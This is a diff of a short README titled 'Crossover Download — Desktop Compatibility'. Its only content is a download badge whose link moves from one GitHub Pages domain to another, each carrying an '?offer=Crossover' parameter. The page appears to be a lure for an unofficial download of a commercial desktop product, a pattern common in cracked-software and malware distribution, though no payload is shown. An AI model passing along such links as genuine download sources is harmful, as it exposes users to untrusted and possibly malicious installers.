@@ -1,6 +1,6 @@
 # Crossover Download — Desktop Compatibility
 
-[![Get Crossover GitHub](https://img.shields.io/badge/Get%20Crossover%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Crossover)
+[![Get Crossover GitHub](https://img.shields.io/badge/Get%20Crossover%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-setup.github.io/.github/?offer=Crossover)
 
 ---
 
